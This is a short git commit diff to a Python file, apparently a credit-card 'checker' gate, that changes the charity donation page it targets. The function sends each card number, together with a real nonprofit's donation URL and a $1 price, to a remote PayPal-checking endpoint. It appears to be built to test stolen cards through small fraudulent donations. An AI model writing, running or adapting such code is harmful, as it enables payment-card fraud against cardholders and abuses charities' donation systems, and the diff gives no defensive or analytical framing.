6feb130106bf28f412cac0d34ac632804206419f
dfof1298-prog <dfof1298@gmail.com>
2026-04-29 00:09:31 +0300

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -1,7 +1,7 @@
 import requests
 def chkk(ccx):
 	cc=ccx.strip()
-	urll="https://beingkid.org/donations/sponsorship-opportunities-for-classes-events/"
+	urll="https://ballardhouseproject.org/donations/ballard_house_project/"
 	price="1"
 	res=requests.get(f'http://pqy2-production.up.railway.app/paypal?cc={cc}&url={urll}&price={price}').text
 	return res
